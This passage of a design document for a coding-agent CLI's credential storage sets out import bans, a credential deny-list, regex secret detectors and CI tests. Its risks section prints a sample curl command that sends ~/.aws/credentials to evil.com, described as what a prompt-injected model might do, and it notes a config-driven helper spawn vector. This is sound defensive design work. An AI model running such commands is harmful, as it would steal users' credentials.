| X5 | a crash bundle that "helpfully" includes config + env | built from an **allow-list of fields**, scrubbed, written 0600, path printed. **kolk never uploads anything** (item 23: no telemetry of any kind). |
| X6 | `kolk export --otlp` / CSV | off by default; first use prints what will leave the machine and requires a typed confirmation |

---

### 6. The item-4 boundary — four mechanisms, zero promises

Item 4 guarantees kolk **never sees, stores, proxies, reads or refreshes a vendor credential**
(Anthropic, OpenAI). Item 5's entire job is *holding* a credential. One shared helper, one shared
type, or one shared `✓` in `doctor` is how that guarantee quietly dies.

#### 6.1 Types — no common interface, no conversion function, no shared field

| | **item 5: kolk's own credential** | **item 4: the vendor's login** |
|---|---|---|
| type | `secret.Value` — a handle kolk can `Reveal()` | `agentcli.LoginState` — a **predicate** about somebody else's login |
| holds | the plaintext (in the vault) | four booleans/enums: `LoggedIn`, `AuthMethod`, `APIProvider`, `Subscription` |
| can be revealed? | yes, at 3 pinned call sites | **there is nothing to reveal** |
| can be stored? | yes, `keystore.Store` | **there is no store for it, and no code that could write one** |
| conversion function | — | **does not exist and cannot be written** — the vault is package-private |

`claude auth status --json` returns **seven** keys, **three of them PII** (`email`, `orgId`,
`orgName`). `LoginState` has nowhere to put them, and `TestLoginState_HasNoIdentityFields`
(reflect-walk) fails CI on any added field — plus a new rule failing on any `secret.Value` field.
**Not having the value is the mechanism; redaction is only the fallback.**

#### 6.2 Imports — five rows in `internal/arch/layers.go`, as reviewed data, failing CI

| # | Rule | What it makes impossible |
|---|---|---|
| **S1** | **`internal/provider/agentcli` may not import `internal/secret` or `internal/keystore` — at all** | extends item 4's C4 (already no `os`, `os/exec`, `net/http`, `syscall`). A backend that cannot **name** the credential type cannot hold, store, forward, log or marshal one. It **may** import `internal/redact`, which is why §2.1 splits the packages. |
| **S2** | `internal/provider/openrouter` may not import `internal/shell` | kolk's own credential path never spawns a process — which is why `oauth.go` is pure and the browser opener lives in L6 |
| **S3** | `internal/keystore` may be imported only by `internal/cli` and `internal/serve` | no provider, engine, bus or transport package can read or write the credential store. Providers receive an injected `secret.Credential` and can do exactly one thing with it. |
| **S4** | `cmd_login.go` may not import `agentcli`; `cmd_login_vendor.go` may not import `secret`/`keystore` | the two `login` code paths share no file and no helper (§4.1) |
| **S5** | `internal/protocol`, `internal/bus`, `internal/engine`, `internal/session`, `internal/stats`, `internal/checkpoint`, `internal/dash` may not import `internal/secret` **or** `internal/keystore` | no event, session record, stats row or dashboard row can name a credential **or a credential-adjacent metadata type** (W2) |

`arch_test.go` has **no `//arch:allow` escape hatch** by design (arch §5): a violation is fixed by
editing the reviewed data file or by fixing the import — never by a comment typed at 1 a.m.

Item 4's `TestCredentialDenylist` (12 forbidden strings anywhere in `agentcli`: `.credentials.json`,
`auth.json`, `Keychain`, `security find-generic-password`, `secret-tool`, `CLAUDE_CODE_OAUTH_TOKEN`,
`setup-token`, `--with-api-key`, `chatgptAuthTokens`, `CLAUDE_CONFIG_DIR`, …) stays exactly as it is.
Item 5 adds nothing to it and takes nothing away.

#### 6.3 The registry — the vendor constructor has no credential parameter

Import bans stop a package from *naming* the type; §2.4's two factory signatures stop anything from
*handing it one*. `provider.Config.APIKey` is deleted; `vendorFactory` has no `secret.Credential`
parameter, and adding one is a compile error at every registered call site.

#### 6.4 UX — where users actually get confused

**The shape deny-list closes the last door: the user's fingers.**

```console
$ kolk key sk-ant-oat01-Xy…
That is a Claude subscription token. kolk must never hold one — nothing was stored.

  To use your Claude plan:  kolk login claude
    kolk hands you to Anthropic's own sign-in, creates no pipe to it, and never
    sees, stores or forwards that credential.
  To use an Anthropic API key instead:  kolk key sk-ant-api03-…
exit 2
```

Item 4's G3 catches the adjacent trap from the other side: `claude setup-token` *looks* like a CI
convenience and prints a one-year OAuth token; it is on the denylist and unreachable from `agentcli`
by construction. **The two lists face each other** — one stops kolk from asking for a vendor token,
the other stops a human from giving kolk one.

**Help text names the owner on every line:**

```
$ kolk login --help
kolk login          sign in to OpenRouter. kolk stores the key it gets back.
kolk login claude   hand you to Anthropic's own sign-in. kolk stores nothing — it
                    cannot: it runs the claude binary you installed, with no pipe
                    between them, and never sees your Anthropic credentials.
```

**`kolk doctor` uses two blocks, two nouns, two Go types, and two renderers that share no formatter**
(§1.5). Five rules make that a mechanism rather than a layout:

1. **The vendor block has no masked-value column at all** — not blank, *absent*. Its renderer takes
   `[]agentcli.LoginState`, a type with no field that could fill one. The absence is enforced by the
   type system, not by a template.
2. **Two functions, no shared formatter.** A refactor that "DRYs up the credential table" cannot
   merge them without changing a type signature — exactly the review moment we want.
3. **Attribution on every vendor line**: `claude reports: signed in`, never a bare `✓ signed in`.
4. **The load-bearing sentence appears verbatim**: *"kolk stores no credential for this backend and
   never reads one."*
5. **`cmd_doctor.go` contains zero `Reveal()` calls** and never touches a backend value.

#### 6.5 `kolk logout claude` tells, it does not do

```console
$ kolk logout claude
kolk holds no credential for claude — there is nothing here to remove.

To sign out of Claude Code itself (this affects the `claude` command everywhere,
not just kolk):

    claude auth logout
```

Item 4 gates `kolk login claude` behind a full explanation and a `Continue? [Y/n]`; the destructive
inverse must not be a silent global side effect fired by someone typing the obvious opposite of what
they just learned. **General rule: no vendor sub-verb mutates vendor state.**

#### 6.6 What a reviewer can check in five minutes

```
internal/provider/agentcli  imports internal/secret or keystore?  → arch_test S1  (must be: no)
provider.Config             has an APIKey field?                   → §2.4         (must be: no)
vendorFactory               has a secret.Credential parameter?     → §2.4         (must be: no)
agentcli.LoginState         any credential-shaped field?           → reflect-walk (must be: no)
cmd_login.go                imports agentcli?                      → arch_test S4 (must be: no)
cmd_login_vendor.go         imports secret/keystore?               → arch_test S4 (must be: no)
cmd_doctor.go               calls Reveal()?                        → AST check    (must be: 0)
kolk key sk-ant-oat…        stores anything?                       → deny-row test(must be: no)
```

Eight mechanical checks, each a CI failure. Any one could be argued away in review; **all eight
cannot be removed by accident**, and that is the property item 4 asked for.

---

### 7. Multi-profile, multi-provider, and project-local files

#### 7.1 The decision

| Capability | v0.1 | Why |
|---|---|---|
| **multi-provider** | **ships ON** | `kolk key <key>` being provider-agnostic **is** napkin line 2 (North star rule 4). Not an advanced capability — the product. The store is keyed by provider from day one, and `kolk key sk-ant-…` works today (stored, labelled "for v0.2"). |
| **multi-profile** | **ships OFF, pre-cut** | no `--profile`, **no `KOLK_PROFILE`**, no `profile =`, nothing in help or docs. The manifest key is already `"<provider>/<profile>"` and v0.1 writes only `default`. |
| **keychain / DPAPI / helper backends** | ships OFF | `kolk key --backend keychain`, discovered from the one-time notice and from `doctor` |
| **project credential overrides** | **never ship** | §7.3 |

**No hidden `KOLK_PROFILE`.** Two drafts proposed reading it "undocumented". A variable that silently
changes *which credential is used* produces an unfixable-looking first-run failure (`kolk` says
"needs a key" while `kolk key` shows one) caused by something the product refuses to admit it reads —
and it contradicts North-star rule 5, which asks for capabilities that ship *off*, not capabilities
that ship *on and hide*. In v0.1 the profile is a **constant at one call site**:

```go
const defaultProfile = "default" // one grep finds every place the selector must be threaded later
func credRef(provider string) keystore.Ref {
    return keystore.Ref{Provider: provider, Profile: defaultProfile}
}
```

**Named unblocker:** the first real "work key vs personal key" request lights up
`--profile` > `KOLK_PROFILE` > project `profile = "work"` > `default` — **no migration, no schema
change, no re-store**, because the file is already keyed for it. `user_id` from the OAuth exchange
(§4.2, currently dropped) becomes the multi-account discriminator. **If any hidden input is ever
read, `kolk key --why` prints it unconditionally.**

#### 7.2 The shared-repo failure mode, for when profiles land

A repo commits `profile = "work"`; a contributor clones it and has no `work` credential. **Do not
fall back to `default`** — silently spending the wrong account's money is precisely the failure this
whole item exists to prevent.

```console
$ kolk
.kolk/config.toml selects profile "work", which has no credential on this machine.
  kolk login --profile work         sign in as that account
  kolk key --profile work sk-…      paste its key
  KOLK_PROFILE=default kolk         use your default account for this run
exit 2
```

#### 7.3 What a project-local file may and may not hold

`.kolk/config.toml` is **meant to be committed** — that is the point of project config, and it is what
makes the rules below non-negotiable rather than cautious.

**May contain:** `model`, `effort`, `mode`, `permission.rules`, `saga.*`, `tool.bash.timeout_s`, and
later `profile = "work"` — a *name*, never a value.

**Must never contain:**

| Forbidden | Why |
|---|---|
| a credential | obvious |
| a **masked** credential | a mask is a fingerprint; prefix + last-4 in a public repo is a correlation aid |
| `key_hash` / a fingerprint | §1.6 — a full digest is a confirmation oracle |
| **★ `credential.store`, a backend name, a helper name, or any store path** | **this one is code execution, not disclosure.** `credential.store = "helper:evil"` in a cloned repo makes kolk spawn `kolk-credential-evil` from `$PATH` on the next invocation — arbitrary code execution from a `git clone`, obtained through a config key that looks innocuous. **Backend and helper selection are user-scope only, full stop.** |
| a PKCE `code_verifier`, `code_challenge`, or callback nonce | no reason for them to touch disk at all |
| the account email / `user_id` from OAuth or `GET /api/v1/key` | PII |
| anything read from `OPENROUTER_API_KEY` | — |
| session transcripts or stats | they contain tool output, and tool output contains whatever the model read |

**Four enforcement mechanisms, because one is not enough:**

1. **The project-config schema has no credential key and no `credential.*` section.** An unknown key
   is a hard error naming the file and line (item 18's layering).
2. **Loader-level refusal by name.** Any key in a *project-scoped* file matching
   `(?i)(key|token|secret|password|credential|authorization|store)` ⇒ **refuse to load the file
   entirely**, name the line, exit 2. **A refusal, not a warning** — a warning gets committed once
   and then ignored forever.
3. **★ Unreachable by construction.** `keystore.Open()` and `FileStore.Path` are supplied by exactly
   one call site in `internal/cli`, computed from `paths.Data()`. **No code path accepts a directory
   argument from config or from a flag** — so `kolk key` cannot be made to write into a project even
   by a future bug or a malicious `.kolk/config.toml`. (`--backend` selects a *backend name*, never a
   path.) This is the mechanism; 1 and 2 are the diagnostics.
4. `kolk` writes `.kolk/.gitignore` covering `.kolk/cache/`, `.kolk/sessions/`, `.kolk/*.local.toml`,
   while `.kolk/config.toml` stays committable — which mechanism 2 is what makes safe.

**Project-level credential *files* are refused outright.** A `.kolk/credentials.json` in a repo you
just cloned is a supply-chain hole: it would let a repo hand you a credential, or silently redirect
your billing. kolk warns loudly and ignores it. Project-level *config* overrides remain fine.

#### 7.4 The credential-helper seam, pre-cut for v0.3

Docker's contract is the best extension seam in this space: any executable named
`kolk-credential-<name>` on `$PATH`, a verb in argv, **JSON on stdin/stdout, never argv**:

| Verb | stdin | stdout |
|---|---|---|
| `get` | `openrouter/default\n` | `{"Secret":"…"}` |
| `store` | `{"Ref":"openrouter/default","Secret":"…"}` | — |
| `erase` | `openrouter/default\n` | — |
| `list` | — | `{"openrouter/default":"", …}` |
| `version` | — | `kolk-credential-1password 0.3.0\n` |

Not-found is signalled by **both** a non-zero exit **and** a stable sentinel on stderr
(`kolk: credential not found`) — Docker matches on the message precisely because exit codes get
mangled by wrappers and shims, and that detail is worth copying. ~60 lines buys 1Password, Bitwarden,
`pass`, gopass, Vault, gcloud and YubiKey with **zero dependencies, zero cgo, and no knowledge of any
of them in the binary** — and it is the same kind of spawn as `/usr/bin/security`, through the same
`Spawner` port. `BackendHelper` is already in the enum and already a legal manifest value; adding
`helper.go` touches no other file.

---

### 8. What CI asserts, and how it is tested without real secrets

**Nothing in this test plan needs a real credential, a network, a keychain, or a browser.** Every
"secret" is a canary constant; every backend is exercised through the injected `Spawner`; the
OAuth protocol is a pure function of bytes with four captured fixtures.

#### 8.1 Type, imports and layering

| # | Assertion |
|---|---|
| 1 | `internal/redact` imports stdlib only and **nothing from `internal/`**; `internal/secret` imports no `os`, `os/exec`, `syscall`, `net` (only `net/http` for `RoundTripper`) and no env; `golang.org/x/sys` appears only in `keystore/dpapi_windows.go` and `term/*` |
| 2 | the only intra-L0 import edges are `secret → redact` and `keystore → {secret, redact}` and `shell → redact`; every other L0 package is stdlib-only |
| 3 | arch rules **S1–S5** (§6.2) |
| 4 | `provider.Config` has **no** `APIKey` field (reflect); `vendorFactory` has no `secret.Credential` parameter (AST) |
| 5 | reflect-walk every registered `protocol` event/command/entity type: no field of type `secret.Value`, `keystore.Entry`, `keystore.Origin`, `keystore.Step` or `keystore.Resolution`; no field name matching `(?i)key\|token\|secret\|password\|authorization\|credential`; no `any`/`map[string]any`/`json.RawMessage` outside a reviewed allow-list |
| 6 | `agentcli.LoginState` has no `secret.Value` field and no string field matching `(?i)token\|key\|secret\|password\|credential` |
| 7 | `spec/schemas/**` are `additionalProperties: false`; no OpenAPI path matches `(?i)cred\|key\|login\|auth` outside the bearer security scheme |
| 8 | `stats.Record` gains no free-text `string` field outside the enum/id allow-list |
| 9 | every `*_unix.go` / `*_darwin.go` / `*_windows.go` in the three packages carries an explicit `//go:build` line (arch §8's silent-wrong-build trap) |
| 10 | `GOOS=windows go build ./...` stays **exit 0** from step 5 onward — it is exit 0 today and must not regress |

#### 8.2 Reveal, printing, and the header

| # | Assertion |
|---|---|
| 11 | `secret.Value.Reveal()` is called from exactly **three** files against a committed allow-list: `secret/transport.go`, `serve/auth.go`, `keystore/backend.go`. Zero calls in `cmd_doctor.go`, `cmd_key.go`, `cmd_config.go`, `cmd_login*.go`, `internal/cli/render`, `agentcli` |
| 12 | **the golden printing matrix**, run **twice — host field exported AND unexported**: `%v %+v %#v %s %q %x %d`, `json.Marshal`, `encoding/gob`, `slog`, `text/template`, `fmt.Errorf("%w")` each contain `[redacted]` and **not** the canary. This is the test that catches the eight leaks of §2.2. |
| 13 | `Value{}` (zero): `IsZero()` true, `Reveal()` `""`, prints `[unset]`; `UnmarshalJSON` errors on every input |
| 14 | **AST check: no `%v`/`%+v`/`%#v`/`%q`/`%s` applied to `*http.Request` or `http.Header` anywhere in the module**; `net/http/httputil` imported nowhere; `GOTRACEBACK` is not set to `crash` |
| 15 | `TestAuthHeaderNeverOnACallerHeldRequest`: build a request through the real client, assert `fmt.Sprintf("%+v", req.Header)` contains no canary, then assert the `RoundTrip` clone does carry it |
| 16 | `redact.Mask`: ≥ 8 characters hidden for every input length 0…128; the prefix and tail slices never overlap (the `len==9`/`len==10` regressions of §2.6) |

#### 8.3 Scrub

| # | Assertion |
|---|---|
| 17 | **the splice test** (item 4's C1 pattern, generalised): inject a canary of every shipped pattern into **every string field of every fixture** — tool outputs, foreign `claude`/`codex` frames, error messages, stderr tails, manifest entries — and assert it appears in no protocol event, no session round-trip, no stats row, no SQLite row, no debug log, no rendered terminal byte |
| 18 | `Scrub(Scrub(x)) == Scrub(x)`; a secret split across chunk boundaries at **every** offset is caught by `redact.Writer`; fuzz: never panics, never turns valid UTF-8 into invalid, never blows up quadratically |
| 19 | **benchmark floor ≥ 150 MB/s** and **< 200 µs on 12 KB** (measured today: 219–230 MB/s, 53 µs) |
| 20 | a committed **false-positive corpus** of ≈200 real non-secret strings (base64 fixtures, git SHAs, UUIDs, `password = ""`, `token: $GITHUB_TOKEN`, `YOUR_TOKEN_HERE`) survives the **tool-boundary** rule set unchanged |
| 21 | `TestStoredButUnusedKeysAreLiterals`: seed the manifest with a shape-less Mistral-style key, run the bash tool `cat`ting the manifest, assert the value does not appear in the tool result |
| 22 | `write_file`/`edit_file` **reject** content containing a sentinel minted **this process**, and **accept** a sentinel-shaped string that was not (so kolk can edit its own redaction tests); the path carve-out is a reviewed data file with its own test |
| 23 | `render`'s writer strips OSC/C1/unapproved-CSI — golden test **including an OSC-52 clipboard payload** and a cursor-repositioning forged prompt |

#### 8.4 Storage, process and filesystem

| # | Assertion |
|---|---|
| 24 | `TestStartupReadsNoCredential` — 0 `Get()` for `version help sessions stats models --cached config completions doctor`, 1 for the turn paths (§3.7) |
| 25 | `TestResolveStartsBeforeDial` — a fake dialer records timestamps |
| 26 | `assertOwnerOnly(t, path)` with a **per-GOOS body** on every credential write, **including on a pre-seeded 0644 file** (the G3 regression); dir is 0700 on unix |
| 27 | `TestProbeNeverAsksForData` — run every registered `Store.Probe` through a `Spawner` and an `http.RoundTripper` that **fail the test if called with a data-requesting argv**; the darwin probe argv contains no `-g`, `-w`, `-d` |
| 28 | `TestBackendTimeout` — a fake `Spawner` that blocks: every backend call is abandoned at 2 s and classified `ErrTimeout` (the hang path is tested with no keychain present) |
| 29 | `TestLockedBackendDoesNotBecomeNoCredential` — `ErrLocked` produces the §3.5 screen, never the first-run screen |
| 30 | `TestNoHomeEnvOnly` — `HOME` unset + `OPENROUTER_API_KEY` set ⇒ resolution succeeds with **zero** filesystem syscalls (counted through an injected FS) |
| 31 | `TestReadOnlyHome` — `kolk key` degrades with a message; the read path is untouched |
| 32 | `TestManifestConcurrentWrite` — 50 goroutines writing distinct refs; every entry survives; no orphan |
| 33 | `shell.Cmd.Env` is non-nil at every construction site (nil panics under test); **no argv or env element at any spawn site equals a registered vault literal** (`ErrSecretInArgv`), including the keychain writer — the test that catches someone "simplifying" `security -i` back to `-w <value>` |
| 34 | `TestBashEnv_NoKolkSecrets` — run the bash tool with `OPENROUTER_API_KEY` and `KOLK_TOKEN` set; assert `env` output contains neither. `TestAgentcliEnv_AllowListOnly` (item 4) unchanged. |
| 35 | `config.json` written by `config.Save` never contains a key matching `(?i)key\|token\|secret` with a non-empty value, and no value matching `://[^/@]*:[^/@]*@`; the migration fixture proves `api_key` moves out, the old file is rewritten, and the operation is idempotent |
| 36 | `checkpoint.Record` refuses a secret-path and records the refusal; **`checkpoint` round-trips a 0600 file at 0600** (the G5 regression) |
| 37 | `serve` returns 400 for `token`/`access_token`/`api_key` query parameters; refuses to start on a non-loopback bind with no token; compares with `crypto/subtle`; every `/dash/*` response carries the CSP header |

#### 8.5 The OAuth protocol, offline forever

| # | Assertion |
|---|---|
| 38 | `TestPKCEVectors` — RFC 7636 Appendix B: `dBjftJeZ…` → `E9Melhoa…`; verifier is 43 chars from the unreserved set; `RawURLEncoding`, unpadded |
| 39 | `TestAuthorizeURL` — exact query, `S256`, percent-encoded `callback_url` with an **empty** query string, headless variant omits `callback_url` and includes `key_label` |
| 40 | `TestParseExchange` — four **captured** fixtures: 200 `{key,user_id}`; 400 `Invalid code`; 400 `ZodError`; 404 `Not Found` → the four typed errors. Regenerated by a recorded-response script, never a live call. |
| 41 | `TestNonceRequired` — `GET /`, `GET /cb/wrong`, `POST /cb/<nonce>` → 404 and the **flow stays open**; then the real path succeeds |
| 42 | `TestDoubleFire` — two concurrent correct callbacks → exactly one result, no panic, no deadlock; `TestShutdownFlushesPage`; `TestBindIsLoopbackOnly` (`ln.Addr()` starts `127.0.0.1:`, a dial to the LAN IP on that port is refused) |
| 43 | `TestLoopbackFallsBackToPaste` — a fake clock; after 20 s with no callback the paste prompt appears **and the listener is still live** |
| 44 | `cmd_login_test.go` — the headless matrix (CI / SSH / no-DISPLAY / WSL / docker / plain macOS) and each of F1–F15's message **and exit code**, against the in-process scripted OpenRouter (`internal/enginetest`) |
| 45 | `cmd_key_test.go` — the full inference table, every deny row, the ambiguity question, the non-TTY exit 2, the CI refusal, and `TestKeyNeverContactsASecondProvider` (an `http.RoundTripper` that fails the test on any host other than the single inferred provider) |

#### 8.6 macOS keychain, tested safely

`keychain_darwin_test.go` runs against a **scratch keychain the test creates with an explicit path
and an explicit password, unlocks non-interactively with `security unlock-keychain -p`, never adds to
the search list, and deletes in `t.Cleanup`** — never the login keychain, never `list-keychains -s`.
It is `t.Skip`ped when `/usr/bin/security` is absent, so Linux CI stays green. It exercises the `-i`
write path, the base64 round-trip, the 3800-byte guard, the exit-code table (44/45/51 measured) and
the metadata-only probe argv. Exit codes **36** and **128** are derived from the `OSStatus mod 256`
rule and must be observed once on a CI runner with no GUI session before this doc is signed off
(§Risks).

---

### 9. Implementation checklist, mapped onto arch §12

**Invariant: `go build ./... && go test ./...` green after every step; the 22 tests stay passing;
`GOOS=windows go build ./...` stays exit 0.**

| # | Where | Work | Green after |
|---|---|---|---|
| **5a** | arch §12 **step 5** | `internal/redact`: `Mask` (replacing `main.go:554 maskKey`, bug fixed) · `keyshapes.json` + `shapes.go` · `Scrub` (scanner) · `Writer` · `SanitizeControls` · the false-positive corpus. **Pure addition, nothing moves.** | 22 + ~8 |
| **5b** | step 5 | `internal/secret`: `Value` + vault + the golden printing matrix (exported **and** unexported) · `Credential` · `AuthTransport`. Still nothing wired. | 22 + ~6 |
| **5c** | step 5 | `internal/keystore`: `Ref`/`Entry`/`Store`/errors · `manifest.go` under `internal/lock` · **`file_unix.go` + `file_windows.go` together** · `spawn.go` port · `chain.go`. Backed by `internal/atomicfile` from the same step. | 22 + ~10 |
| **5d** | step 5 | **`keystore/migrate.go`** + `testdata/v0-config-with-key.json`: `config.json.api_key` → the manifest, `config.json` rewritten without it, in **one commit with its fixture**. `internal/config` stops knowing about credentials. | 22 + 2 |
| **5e** | step 5 | **Move the credential read off the startup path**: `cmd/kolk/main.go:118`'s unconditional `ResolveAPIKey` becomes `engine.Options.Provider` (a thunk). Add `TestStartupReadsNoCredential`. Tighten `scripts/check-budgets.sh` to **15 ms** for `kolk version`. | 22 + 1 |
| **5f** | step 5 | **`internal/cli/cmd_key.go`**: `kolk key <key>` / bare / `-` / `<provider> <key>` / `--why` / `--manage`, `kolk logout`, the deny rows, the ambiguity question, the CI refusal, the shadowing warning (write-time **and** read-time). **The napkin now works end to end.** | 22 + ~12 |
| **5g** | step 5 | The three-state "no credential" screen (§1.5) — deletes `main.go:118`'s hard exit; `NOT REQUIRED` for non-OpenRouter base URLs (item 3 §2550's deletion lands here), `ALTERNATIVE AVAILABLE` via `shell.LookPath("claude")`. | 22 + 3 |
| **5h** | step 5 | `arch_test.go` rules **S1–S5** + the `Reveal()` allow-list + the `%v`-on-`http.Request` AST check + the `httputil` denylist. **The mechanisms become mechanical here, not at the end.** | 22 + ~6 |
| **5i** | step 5 (L0 `shell`) | `shell.Cmd{Stdin, Env (required non-nil), Setsid}`; **`ErrSecretInArgv`**; the bash-tool env subtraction (closes **G1**); `syscall.Setrlimit(RLIMIT_CORE,{0,0})` in `rlimit_unix.go`. | 22 + 4 |
| **5j** | step 5 (L5) | **`checkpoint`**: refuse secret paths (**G4**), restore the captured mode (**G5**); `config set-base-url` strips userinfo (**W9**); every kolk-state writer moves to `internal/atomicfile` with a random temp suffix (**D13**). | 22 + 5 |
| **6a** | after arch §12 **step 6** | `internal/provider/openrouter/oauth.go` (pure) + the four captured fixtures + `TestPKCEVectors`. No sockets yet. | +6 |
| **7a** | after **step 7** (bus exists) | `bus.Publish` scrub chokepoint · `tools.Execute` scrub chokepoint · `debuglog.Write` · `render`'s writer + `SanitizeControls` · the **splice test**. | +8 |
| **8a** | after **step 8** (Decider) | `internal/cli/cmd_login.go` + `loopback.go` + `internal/browse/` (the four OS files) + the full F1–F15 matrix + the 20-second paste fallback. `kolk login` ships. | +12 |
| **9a** | with **step 9** (ports) | `provider.Config.APIKey` deleted; the two factory signatures; `AuthTransport` wired into `openrouter` and `openaicompat`. | 22 |
| **11a** | with **step 11** (`serve`) | bearer token as a `secret.Value` under the same deny; the `?token=` 400; the `__Host-kolk` cookie; `Origin`/`Host` allow-list; the daemon's 401/mtime re-resolve. | +5 |
| **12a** | with **step 12** (`dash`) | db created 0600 **before** SQLite opens it; the CSP header; ingest inherits the bus scrub. | +3 |
| **13a** | with **step 13** (Windows) | `dpapi_windows.go` (`enc:"dpapi"` over the same manifest, `CRYPTPROTECT_UI_FORBIDDEN`) — a **pure upgrade**, one-time re-seal, no schema change. Credential Manager stays deferred. | 22 on all three |
| **14a** | with **step 14** | `keychain_darwin.go` + `keychain_unix.go` behind `kolk key --backend keychain`, with the scratch-keychain test. | +6 |
| **later** | v0.3 | `helper.go` — `kolk-credential-<name>`, docker-shaped (§7.4). | — |

Steps **5a–5j all land inside arch §12 step 5**, which is where "secret/paths extraction" already
lives. That is a large step, but every sub-step is independently green, and the ordering is chosen so
**5f (the napkin) works before any of the opt-in machinery exists.**

---

## Rationale

**Why the file is the default, honestly.** The usual defence — *"but the keychain is encrypted"* — is
much weaker than it sounds on the platform where it is available. The item's ACL trusts
`/usr/bin/security`, not kolk, so any process running as the user reads the value back with **no
prompt**. Against the two threats that dominate a developer laptop — the model under prompt
injection, and a compromised dependency in the project kolk is working in — a Keychain item and a
0600 file are equivalent. What the keychain genuinely buys is encryption at rest against a stolen
disk, a backup, and a synced dotfiles directory. That is real, and it is exactly one `kolk key
--backend keychain` away. It is not worth making the default path one that can raise a macOS password
dialog, hang on a D-Bus prompt, or die over SSH.

**Why the credential read leaving `config.json` matters more than the backend choice.** Measured
today: `config.Save` cannot repair a 0644 file, is not atomic, and puts the key in the one file users
`cat` for the model and paste into issues. Fixing that, clearing the bash child's environment, and
stopping `/rewind` from writing 0644 are worth more to a real user's posture than the choice between
Keychain and a 0600 file. The keychain is the correct *opt-in* on top of that, not a substitute for
it.

**Why the credential type is a handle.** Not an argument — a measurement. Eight `fmt`/`slog` paths
leak from a plaintext-in-the-type design the moment the value sits in an unexported struct field,
because `fmt.printValue` reaches `handleMethods` only when `value.CanInterface()`. `encoding/json` is
the safe sink; `fmt` is the dangerous one, and `fmt` is what a `recover()` handler reaches for. Every
alternative is one refactor away from a leak.

**Why the `RoundTripper`.** Because the handle is not enough: `%+v` on the resulting `*http.Request`
prints the live key, verified. Structural fixes must be pushed all the way to the last object that
holds the plaintext, or they only relocate the reviewer's false confidence.

**Why one published, numbered chain with a printable trace.** "Why is kolk using the wrong key" is
the most common credential support question in every CLI surveyed. AWS's numbered precedence list is
the artifact every AWS support conversation starts from; `gh`'s single best detail is printing the
credential *source* inline on its headline. kolk generalises `gh` from accounts to sources, and it
makes the losing links visible — because "the list is short because there is nothing" must be
distinguishable from "the resolver did not look."

**Why the scrub is split by sink.** A single set makes the agent unable to edit any real backend repo
containing `.env.example` or a JWT fixture, and unable to work on kolk's own security tests. Exact
literals have zero false positives and cover the secrets we actually own; high-confidence anchored
prefixes cover the user's other keys; the keyword rule — the false-positive machine — is confined to
sinks where a mangled string costs nothing functional.

**Why the vendor boundary is four mechanisms.** Any one of them could be argued away in a code
review. All four cannot be removed by accident, which is precisely the property item 4 asked for.

---

## Alternatives rejected

- **Keychain-first as the default** — the strongest at-rest posture, but `/usr/bin/security` has no
  non-interactive flag, a locked login keychain with a GUI session raises a password dialog, and the
  manifest-plus-keychain combination produces a hard lockout the moment the home directory is synced
  or the user SSHes into their own Mac. Kept as the discoverable opt-in, made the recommended default
  only on a detected network filesystem.
- **In-process Keychain via cgo / Security.framework** — puts kolk's `cdhash` in the ACL, and
  `-ldflags -X buildinfo.Version` changes it every release ⇒ a modal password dialog after **every
  upgrade**. Also forfeits `CGO_ENABLED=0`.
- **`godbus/dbus/v5` for Linux Secret Service** — 7,953 LOC across 57 files, 2.3× the current
  codebase, permanently in L0 on the credential path. Refused; `secret-tool` is opportunistic only.
- **Windows Credential Manager in v0.1** — `x/sys/windows` v0.47.0 exports no `Cred*` symbols, so it
  is ~444 LOC of hand-declared `unsafe` syscalls; DPAPI is ~15 lines over APIs `x/sys` already
  exports, with the same per-user protection. Deferred to step 13, with the plain file as the Windows
  default meanwhile.
- **Any third-party keyring library** — banned by the item's constraints, and reading
  `zalando/go-keyring` to write this design surfaced two bugs we would have inherited: an off-by-one
  size guard (`> 4096` where `security` fails **at** 4096) and error detection by English substring
  match.
- **Probing multiple providers to disambiguate a bare `sk-` key** — resolves the ambiguity in 400 ms
  by handing the user's live credential to up to two vendors who should never have seen it. One
  question is cheaper than an unrecoverable disclosure.
- **A `--api-key` flag** — argv is world-readable; `gh` ships no token flag and Vercel's docs say
  why. Link 0 is documented as structurally empty so nobody adds one.
- **`kolk login --print-key` / `kolk auth token`** — every "paste your token here" support thread
  starts with one. Recovery from a lost key is `kolk login` again, which is cheap and mints a *new
  revocable* key.
- **`POST /v1/credentials` or `/v1/login` over HTTP+SSE** — written down as permanently out of scope,
  with a conformance test asserting a closed path set, so nobody adds it in v0.6 for the iPad client.
- **A hidden `KOLK_PROFILE` read in v0.1** — shipped behaviour denied in the docs and invisible in
  the diagnostic. Profiles ship off, keyed, at one call site.
- **A project-scoped `credential.store` / helper name** — arbitrary code execution from a `git clone`.
  Backend selection is user-scope only.
- **A single scrub set at every sink** — breaks `edit_file` on real repos and on kolk's own tests.
- **Inventing exit codes 4–7 for the login matrix** — arch §9 and `spec/errors.md` own a five-code
  vocabulary; forking it for one command is churn with no payoff. Discrimination is `error.type`.
- **Obfuscating the file (base64, a disk-derived key)** — Docker base64s its config and users believe
  it is encrypted. A lie is worse than plaintext. Encryption happens only where the OS holds the key.
- **Rewriting the user's shell history after `kolk key <key>`** — too invasive to do silently. Name
  `$HISTFILE` and the two escapes instead.

---

## Risks & open questions

**Residual risks — stated, not papered over.**

1. **Exfiltration by a determined or prompt-injected model bypasses kolk entirely.**
   `curl -d "$(cat ~/.aws/credentials)" evil.com` never routes those bytes through the scrubber.
   Scrubbing prevents *accidental* exposure into the transcript, the third-party provider, the
   dashboard and the bug report. **The real fix is item 13's sandbox/network toggle**, and this
   document does not claim coverage.
2. **`/proc/<pid>/environ` (Linux) and `ps -E` (macOS, same user) defeat env subtraction for an
   exported key.** `os.Unsetenv` does not rewrite the kernel's copy of the initial stack.
   **Unfixable.** It is an argument for the store over the env var, and `doctor` says so.
3. **Memory zeroing in Go is partial.** `secret.Close()` clears the vault's `[]byte`s;
   `Reveal()` hands out a GC-owned string copy that lives inside `net/http` for the request's
   lifetime. Documented as partial; **never a README claim.**
4. **`security` exit code 44 conflates absent / missing-keychain-file / locked-non-default.** kolk
   disambiguates using the manifest (if the manifest says this backend holds it, 44 means
   `ErrUnavailable`, not `ErrNotFound`), which is correct but not airtight. `doctor` names which
   backend answered, so it is visible rather than invisible.
5. **The `bash` deny-list will miss a variable eventually.** Deny-lists forget; the alternative
   (clearing the user's environment) breaks every build. The fallback is exact literal scrubbing,
   which is certain for the secrets kolk owns, and `doctor` prints the subtraction list so the
   omission is at least inspectable.
6. **The hard deny is reliable on resolved paths and best-effort in `bash`.** `S=kolk; security
